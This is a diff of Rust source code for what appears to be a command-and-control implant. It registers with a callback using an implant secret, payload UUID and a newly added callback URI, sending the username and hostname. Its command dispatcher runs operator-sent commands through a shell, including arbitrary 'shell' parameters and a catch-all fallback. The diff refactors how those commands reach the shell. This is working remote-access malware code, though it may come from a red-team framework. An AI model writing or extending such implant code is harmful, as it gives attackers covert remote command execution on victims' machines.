@@ -60,6 +60,7 @@ pub fn link_loop() {
         crate::CALLBACK,
         crate::IMPLANT_SECRET,
         crate::PAYLOAD_UUID,
+        crate::CALLBACK_URI,
         link_common::RegisterInfo {
             user: username(),
             host: hostname(),
@@ -76,13 +77,7 @@ pub fn link_loop() {
 // ── Command dispatch ─────────────────────────────────────────────────────────
 
 fn dispatch(command: &str, parameters: &str) -> String {
-    let raw = if parameters.is_empty() {
-        command.to_string()
-    } else {
-        format!("{} {}", command, parameters)
-    };
-
-    if let Some(output) = dispatch_common(&raw) {
+    if let Some(output) = dispatch_common(command, parameters) {
         return output;
     }
 
@@ -92,7 +87,7 @@ fn dispatch(command: &str, parameters: &str) -> String {
         "ps" => shell_exec("ps aux"),
         "netstat" => shell_exec("netstat -an"),
         "shell" => shell_exec(parameters),
-        _ => shell_exec(&raw),
+        _ => shell_exec(parameters),
     }
 }
 
